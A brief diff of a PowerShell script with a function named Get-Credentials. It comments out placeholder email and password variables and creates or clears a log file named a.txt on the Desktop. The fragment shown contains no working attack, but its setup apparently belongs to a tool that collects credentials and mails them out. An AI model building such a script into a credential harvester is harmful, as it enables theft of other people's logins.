@@ -1,6 +1,8 @@
 function Get-Credentials{
-$emailaddress = "youremail@gmail.com"
-$emailpwd = "yourpassword"
+
+<#$emailaddress = "youremail@gmail.com"
+$emailpwd = "yourpassword"#>
+
 $logfilepath = "$HOME\Desktop\"
 $logfile = "$HOME\Desktop\a.txt"
 if (!(test-path -path $logfile)){new-item -path $logfilepath -name "a.txt" -itemtype "file"}else{"" > $logfile}
